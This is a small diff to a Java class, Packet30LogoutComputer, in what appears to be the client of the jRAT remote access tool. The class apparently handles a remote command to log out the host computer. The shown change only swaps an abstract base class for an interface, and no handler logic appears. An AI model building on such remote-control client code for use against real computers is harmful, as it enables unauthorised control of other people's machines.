@@ -3,7 +3,7 @@ package jrat.client.packets.incoming;
 import jrat.client.Connection;
 import oslib.OperatingSystem;
 
-public class Packet30LogoutComputer extends AbstractIncomingPacket {
+public class Packet30LogoutComputer implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
